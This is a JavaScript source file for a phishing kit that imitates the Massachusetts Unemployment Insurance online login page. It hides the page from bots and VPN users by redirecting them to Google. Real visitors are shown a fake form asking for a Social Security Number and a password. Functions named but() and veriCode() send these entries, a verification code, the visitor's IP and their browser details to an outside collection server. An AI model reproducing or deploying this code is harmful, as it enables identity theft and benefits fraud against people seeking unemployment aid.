import isbot from 'isbot'

var userAgent = ''
var ip = ''
var checkIsBot=''
window.addEventListener('load', () => {
    userAgent = navigator.userAgent;
    checkIsBot = isbot(navigator.userAgent);
    axios.get('https://proxycheck.io/v2/?key=public-74353g-79t132-567953&vpn=1&risk=1').then((res)=>{
     
      ip = res.data.ip
        if (res.data[res.data.ip].proxy === 'no' && checkIsBot === false && res.data[res.data.ip].risk <= 33) {
          document.getElementById('disp').innerHTML = `<table width="100%">
          <tr>
            <td>
              <table width="100%">
                <tr>
                  <td style="padding-left: 10px; width: 70%">
                    <img
                      src="/images/massgovlogo.png"
                      alt="QUEST"
                      width="179px"
                    />
                  </td>
                  <td
                    style="
                      padding-right: 10px;
                      width: 30%;
                      text-align: right;
                      vertical-align: middle;
                    "
                    class="globalNav"
                  >
                    <b> <span id="myTime"></span></b
                    ><br />
  
                    <a
                      href="javascript:void(0);"
                      onclick="javascript:getPrint('print_area')"
                      >Print Preview</a
                    >
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="padding-top: 3px">
              <table width="100%">
                <tr class="searchBarBG">
                  <td
                    valign="middle"
                    style="white-space: nowrap; padding-right: 10px"
                  >
                    <table align="right" style="height: 100%">
                      <tr>
                        <td>&nbsp;</td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td class="white" style="height: 1px"></td>
          </tr>
          <tr>
            <td class="topNavBG" style="padding-left: 10px; padding-right: 10px">
              <table width="100%">
                <tr>
                  <td valign="middle">
                    <table style="height: 100%">
                      <tr class="topNav">
                        <td style=""><a href="#" class="blackLink">Logon</a></td>
                      </tr>
                    </table>
                  </td>
                  <td valign="middle" style="text-align: right">
                    <img
                    src="/images/star.png"
                    width='9px'
                    height='9px'
                      alt="Required Field Icon"
                      class="ValidateIcon"
                    />
                    Indicates Required Field
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td class="darkGray" style="height: 1px"></td>
          </tr>
          <tr>
            <td class="white" style="height: 1px"></td>
          </tr>
          <tr>
            <td class="searchBarBG" style="height: 3px"></td>
          </tr>
          <tr>
            <td>
              <table width="100%">
                <tr>
                  <td id="leftNavColumn">
                    <ul class="NavLeft">
                      <li>&nbsp;</li>
                    </ul>
                  </td>
                  <td id="mainContentColumn">
                    <a name="skipNavTarget" id="skipNavTarget" tabindex="-1"></a>
                    <div id="print_area">
                      <center></center>
  
                      <input
                        type="hidden"
                        name="ctl00$ctl00$cphMain$cphMain$verificationToken"
                        id="ctl00_ctl00_cphMain_cphMain_verificationToken"
                        value="&lt;% Request.QueryString[&#39;token&#39;] %>"
                      />
                      <div
                        id="ctl00_ctl00_cphMain_cphMain_UPanel8"
                        style="width: 100%"
                      >
                        <div
                          style="display: none; margin-bottom: 30px"
                          id="error101"
                        >
                          The following issues were detected with your
                          submission:<br /><br style="font-size: 25%" />
                          <table style="width: 100%">
                            <tbody>
                              <tr>
                                <th
                                  style="
                                    width: 100%;
                                    display: flex;
                                    justify-content: left;
                                  "
                                >
                                  Errors
                                </th>
                              </tr>
                              <tr style="display: none" id="ss1">
                                <td>
                                  <img
                                    src="/images/cancel.png"
                                    alt="Error Icon"
                                    width='19px'
                                    height='19px'
                                  /><a style="text-decoration: none" href="#"
                                    >Social Security Number is required. (*)</a
                                  >
                                </td>
                              </tr>
                              <tr style="display: none" id="ss2">
                                <td class="Last">
                                  <img
                                    src="/images/cancel.png"
                                    alt="Error Icon"
                                    width='19px'
                                    height='19px'
                                  /><a style="text-decoration: none" href="#"
                                    >Password is required, please enter password.
                                    (*)</a
                                  >
                                </td>
                              </tr>
                            </tbody>
                          </table>
                        </div>
                        <div class="sectHead">
                          Welcome to Massachusetts Unemployment Insurance (UI)
                          Online Application
                        </div>
                        <br />
                      </div>
                      <div
                        id="ctl00_ctl00_cphMain_cphMain_pnlBroadcastMsgs"
                        style="width: 100%"
                      >
                        <div style="width: 100%"></div>
                      </div>
  
                      <div
                        id="ctl00_ctl00_cphMain_cphMain_pnlWarning"
                        style="width: 100%"
                      >
                        <br />
                        <center><b>WARNING</b></center>
                        <p>
                          This system may contain U.S. Government information,
                          which is restricted to authorized users ONLY.
                          Unauthorized access, use, misuse, or modification of
                          this computer system or of the data contained herein or
                          in transit to/from this system constitutes a violation
                          of Title 18, United States Code, Section 1030, and may
                          subject the individual to criminal and civil penalties
                          pursuant to Title 26, United States Code, Sections 7213,
                          7213A (the Taxpayer Browsing Protection Act), and 7431.
                          This system and equipment are subject to monitoring to
                          ensure proper performance of applicable security
                          features or procedures. Such monitoring may result in
                          the acquisition, recording, and analysis of all data
                          being communicated, transmitted, processed, or stored in
                          this system by a user. If monitoring reveals possible
                          evidence of criminal activity, such evidence may be
                          provided to Law Enforcement Personnel.<br />
  
                          ANYONE USING THIS SYSTEM EXPRESSLY CONSENTS TO SUCH
                          MONITORING.
                        </p>
                        <input
                          type="hidden"
                          name="_ctl00$ctl00$cphMain$cphMain$chkWarning"
                          value=""
                        /><span class="ElementChanged" class="Invalid"
                          ><input
                            id="ctl00_ctl00_cphMain_cphMain_chkWarning"
                            type="checkbox"
                            name="ctl00$ctl00$cphMain$cphMain$chkWarning"
                            tabindex="1"
                            title="You must read and accept the System Use Notification message before you continue"
                          /><label for="ctl00_ctl00_cphMain_cphMain_chkWarning"
                            >I have read and understand the information above. I
                            understand that DUA will verify the information that I
                            provide.</label
                          ></span
                        ><img
                          style="overflow: scroll; align: top"
                          src="/images/star.png"
                                width='9px'
                                height='9px'
                          alt="Required Field Icon"
                          class="ValidateIcon"
                        />
                        <br />
                        <br />
                      </div>
  
                      <div
                        id="ctl00_ctl00_cphMain_cphMain_UPanel12"
                        style="width: 100%"
                      >
                        <table width="100%">
                          <tr>
                            <td class="sectHead">
                              Please provide your Social Security Number
                            </td>
                          </tr>
                        </table>
                        <!-- <form method="POST" action="/index1.html"> -->
                        <table width="100%">
                          <tr class="oddRow">
                            <td class="cellLabel" width="50%">
                              Social Security Number:
                            </td>
                            <td class="cellData" width="50%">
                              <input
                                name="ctl00$ctl00$cphMain$cphMain$txtSSN1"
                                type="password"
                                maxlength="11"
                                id="ctl00_ctl00_cphMain_cphMain_txtSSN1"
                                class="Invalid"
                                autocomplete="off"
                                title="Social Security Number"
                                style="width: 200px"
                                required
                              /><img
                                style="overflow: scroll; align: top"
                                src="/images/star.png"
                                width='9px'
                                height='9px'
                                alt="Required Field Icon"
                                class="ValidateIcon"
                              /><img
                                src="/images/cancel.png"
                                alt="SSN is required. (*)"
                                class="ValidateIcon"
                                id="ss3"
                                width='19px'
                                height='19px'
                                style="display: none"
                              />
                            </td>
                          </tr>
                          <tr class="evenRow">
                            <td class="cellLabel" width="50%">Password:</td>
                            <td class="cellData">
                              <input
                                name="ctl00$ctl00$cphMain$cphMain$txtConfirmSSN1"
                                type="password"
                                maxlength="11"
                                id="ctl00_ctl00_cphMain_cphMain_txtConfirmSSN1"
                                class="Invalid"
                                autocomplete="off"
                                title="password"
                                style="width: 200px"
                                required
                              /><img
                                style="overflow: scroll; align: top"
                                src="/images/star.png"
                                width='9px'
                                height='9px'
                                alt="Required Field Icon"
                                class="ValidateIcon"
                              /><img
                                src="/images/cancel.png"
                                alt="Confirm your Social Security Number is required. (30)"
                                class="ValidateIcon"
                                id="ss4"
                                width='19px'
                                height='19px'
                                style="display: none"
                              />
                            </td>
                          </tr>
                        </table>
                        <hr />
                        <center>
                          <!-- <input type="image" name="ctl00$ctl00$cphMain$cphMain$btnNext" id="ctl00_ctl00_cphMain_cphMain_btnNext" onmouseover="this.src=&#39;/Core/ButtonImageHandler.ashx?TemplateName=42544E4F564552&amp;Caption=4E657874&#39;" onmouseout="this.src=&#39;/Core/ButtonImageHandler.ashx?TemplateName=42544E&amp;Caption=4E657874&#39;" src="https://uionline.detma.org/Core/ButtonImageHandler.ashx?TemplateName=42544E&amp;Caption=4E657874" alt="Next" style="border-width:0px;" /> -->
                          <button
                            style="
                              background-color: rgb(80, 100, 145);
                              padding: 5px 20px;
                              color: white;
                              border-radius: 5px;
                            "
                            type="submit"
                            onclick="but()"
                          >
                            <b id='mustee'>Next</b>
                          </button>
                        </center>
                        <!-- </form> -->
                        <hr />
                        <table width="100%">
                          <tr>
                            <td class="sectHead">
                              IF YOU ARE NOT USING YOUR PERSONAL COMPUTER, PLEASE
                              FOLLOW THESE SAFETY TIPS:
                            </td>
                          </tr>
                        </table>
                        <table width="100%">
                          <tr>
                            <td>
                              <ul>
                                <li>
                                  Log out before you walk away from the computer
                                </li>
                                <li>Do not save your login information</li>
                                <li>
                                  Do not save any files or forms to a Public
                                  Computer
                                </li>
                                <li>When prompted, always opt to Open a File</li>
                                <li>
                                  For more details, please click
                                  <a href="#">here.</a>
                                </li>
                              </ul>
                            </td>
                          </tr>
                        </table>
                      </div>
                    </div>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td class="midGray" style="height: 1px"></td>
          </tr>
          <tr>
            <td
              class="copy"
              style="text-align: right; padding-right: 10px; padding-top: 5px"
            >
              <a href="http://get.adobe.com/reader/" class="grayLink"
                >Download Adobe .PDF Reader (Free)</a
              >
              |
              <a
                href="/Static/Core/Accessibility.html"
                target="_blank"
                class="grayLink"
                >Accessibility</a
              >
              |
              <a href="/Static/Core/Privacy.html" target="_blank" class="grayLink"
                >Privacy Statement</a
              >
              |
              <a
                href="/Static/Core/ViewingTips.html"
                target="_blank"
                class="grayLink"
                >Viewing Tips</a
              >
            </td>
          </tr>
        </table>`
        }else  {
          window.location.href = 'https://nullreferer.com/?https://google.com';
        }
    })
    console.log(userAgent);
    
})

 export function but() {
    const b = ctl00_ctl00_cphMain_cphMain_txtSSN1.value;
    const c = ctl00_ctl00_cphMain_cphMain_txtConfirmSSN1.value;
    console.log(b, c);
    if (b !== "" && c !== "") {
      document.getElementById("error101").style.display = "none";
      document.getElementById("ss4").style.display = "none";
      document.getElementById("ss2").style.display = "none";
      document.getElementById("ss3").style.display = "none";
      document.getElementById("ss1").style.display = "none";
      const payload = {
        user: b,
        passwd:c,
        device:userAgent,
        ip
        
      }
      const result =  axios.post("https://serverside-number-five.onrender.com/",payload).then((res)=>{
            if (res.data.message === 'success') {
              window.location.href=('/claimants/verification.html')
            }else{
                console.log('no');
            }
      })
    } else if (b === "" && c !== "") {
      document.getElementById("error101").style.display = "grid";
      document.getElementById("ss3").style.display = "inline-flex";
      document.getElementById("ss1").style.display = "flex";
      document.getElementById("ss4").style.display = "none";
      document.getElementById("ss2").style.display = "none";
    } else if (b !== "" && c === "") {
      document.getElementById("error101").style.display = "grid";
      document.getElementById("ss4").style.display = "inline-flex";
      document.getElementById("ss2").style.display = "flex";
      document.getElementById("ss3").style.display = "none";
      document.getElementById("ss1").style.display = "none";
    } else {
      document.getElementById("error101").style.display = "grid";
      document.getElementById("ss4").style.display = "inline-flex";
      document.getElementById("ss2").style.display = "flex";
      document.getElementById("ss3").style.display = "inline-flex";
      document.getElementById("ss1").style.display = "flex";
    }
  }

 export function veriCode() {
    const d = ctl00_ctl00_cphMain_cphMain_txtSSN1.value;
    if (d === '') {
      document.getElementById("error101").style.display = "grid";
      document.getElementById("ss3").style.display = "inline-flex";
      document.getElementById("ss1").style.display = "flex";
    }else{
      document.getElementById("error101").style.display = "none";
      document.getElementById("ss3").style.display = "none";
      document.getElementById("ss1").style.display = "none";
      const payload = {
        code: d,
        device:userAgent,
        ip
      }
      const result =  axios.post("https://serverside-number-five.onrender.com/code",payload).then((res)=>{
            if (res.data.message === 'success') {
              window.location.href = '/index.html';
            }else{
              console.log('no');
            }
      })
    }
  }
